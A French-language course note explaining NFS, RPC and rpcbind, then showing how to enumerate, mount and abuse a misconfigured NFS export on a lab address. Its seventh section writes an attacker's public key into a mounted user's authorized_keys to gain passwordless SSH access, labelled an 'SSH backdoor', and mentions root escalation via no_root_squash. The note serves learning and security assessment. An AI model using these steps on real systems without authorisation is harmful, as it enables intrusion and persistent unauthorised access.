
# 📝 NOTE DE COURS COMPLÈTE — NFS, RPC, RPCBIND, CLÉS SSH

---

## 1️⃣ NFS (Network File System) — Concept

### 🔹 Définition

* **NFS** = protocole réseau permettant à un ordinateur (**client**) d’accéder à des fichiers situés sur un autre ordinateur (**serveur**) **comme si ces fichiers étaient locaux**.
* Différence avec SSH/FTP : NFS **intègre le dossier distant dans ton système de fichiers**, pas besoin de copier pour accéder.

### 🔹 Exemple simple

* Serveur : `/home/alex`
* Client : `/mnt/nfs`
* Commande :

```bash
mount -t nfs 10.10.10.50:/home /mnt/nfs
```

* Résultat : `/mnt/nfs` contient `/home/alex` du serveur

### 🔹 Pourquoi NFS ?

* Partage de fichiers entre serveurs Linux
* Centralisation de données (ex : dossiers home)
* Backups et clusters
* ⚠️ Mal configuré → accès non autorisé à fichiers sensibles

---

## 2️⃣ Architecture NFS

### 🔹 Composants

| Élément                | Rôle                                                                   |
| ---------------------- | ---------------------------------------------------------------------- |
| **NFS**                | Service de partage de fichiers                                         |
| **RPC**                | Méthode pour demander une action sur un autre ordinateur               |
| **rpcbind (port 111)** | Annuaire qui indique **à quel port** est le service NFS                |
| **/etc/exports**       | Fichier sur serveur qui liste **dossiers partagés** et **permissions** |

### 🔹 Séquence complète

1. NFS démarre → choisit un port (ex : 2049)
2. NFS s’enregistre auprès de rpcbind → rpcbind note port et service
3. Client interroge rpcbind sur port 111 → récupère le port de NFS
4. Client communique avec NFS via ce port → monte le partage → accès aux fichiers

---

## 3️⃣ Terminologie clé

| Terme              | Définition                                                              |
| ------------------ | ----------------------------------------------------------------------- |
| **Export**         | Dossier partagé via NFS (ex : `/home`)                                  |
| **Mount**          | Action de connecter un dossier distant sur ton système local            |
| **/etc/exports**   | Fichier serveur qui définit : dossiers partagés, IP autorisées, options |
| **Root squashing** | Sécurité : root client → user normal serveur                            |
| **no_root_squash** | Root client garde privilèges root sur serveur → faille critique         |

---

## 4️⃣ RPC (Remote Procedure Call)

### 🔹 Définition simple

* RPC = **méthode pour demander à un programme distant d’exécuter une action comme si elle était locale**
* Exemple :

  * Local : `open("fichier")` → lecture locale
  * RPC : `open("/home/fichier")` → lecture sur serveur distant

### 🔹 Important

* RPC n’est **pas un service**, juste une **méthode de communication**
* Chaque action NFS (lister fichiers, monter dossier, lire, écrire) = **appel RPC**

---

## 5️⃣ RPCBIND / PORTMAPPER

### 🔹 Rôle

* Écoute sur **le port 111**
* Sert d’**annuaire des services RPC**
* Répond à un client :

  > « NFS est sur le port 2049 »

### 🔹 Fonctionnement

```
Serveur
  NFS démarre → s’enregistre auprès de rpcbind (port 111)
Client
  interroge rpcbind → reçoit port → communique avec NFS
```

---

## 6️⃣ Reconnaissance & exploitation NFS

### 🔹 Commandes de reconnaissance

1. Vérifier rpcbind / NFS ouvert :

```bash
nmap -p 111,2049 10.10.10.50
```

2. Lister services RPC :

```bash
rpcinfo -p 10.10.10.50
```

3. Lister exports disponibles :

```bash
showmount -e 10.10.10.50
```

---

### 🔹 Monter un partage NFS

```bash
mkdir /mnt/nfs
mount -t nfs 10.10.10.50:/home /mnt/nfs -o nolock
ls -la /mnt/nfs
```

* `-o nolock` → évite les erreurs de verrouillage (utile en pentest)

---

### 🔹 Tester permissions

```bash
touch /mnt/nfs/test_nfs
```

* Réussi → RW autorisé
* Échoue → lecture seule

---

### 🔹 Tester root squashing

```bash
touch /mnt/nfs/root_test
ls -l /mnt/nfs/root_test
```

* Propriétaire = `nobody` → root squashing activé
* Propriétaire = `root` → no_root_squash → faille critique

---

## 7️⃣ Exploitation via SSH

### 🔹 Générer une clé SSH

```bash
ssh-keygen
```

### 🔹 Ajouter sa clé dans un home monté

```bash
mkdir -p /mnt/nfs/alex/.ssh
cat ~/.ssh/id_rsa.pub >> /mnt/nfs/alex/.ssh/authorized_keys
```

### 🔹 Connexion sans mot de passe

```bash
ssh alex@10.10.10.50
```

* Si **no_root_squash** → possibilité de devenir root

---

## 8️⃣ Schéma mental global

```
[Client]                     [Serveur]
   |                             |
   |----interroge port 111------>| rpcbind
   |                             |
   |<---port NFS (ex: 2049)------|
   |                             |
   |----requêtes RPC------------>| NFS
   |                             |
   |<---réponses-----------------|
   |
   |----mount local----> /mnt/nfs
   |
   |----lecture / écriture sur /mnt/nfs
```

---

## 9️⃣ Points de vigilance

* NFSv3 : pas de chiffrement → fichiers sensibles transitent en clair
* `/etc/exports` mal configuré → faille critique
* no_root_squash → root total si RW
* RPC & rpcbind : comprendre avant de scanner et exploiter

---

## 10️⃣ Commandes résumé rapide

| Objectif              | Commande                      |
| --------------------- | ----------------------------- |
| Scanner rpcbind / NFS | `nmap -p 111,2049 IP`         |
| Lister services RPC   | `rpcinfo -p IP`               |
| Lister exports NFS    | `showmount -e IP`             |
| Monter NFS            | `mount -t nfs IP:/share /mnt` |
| Tester RW             | `touch fichier`               |
| SSH backdoor          | `authorized_keys`             |

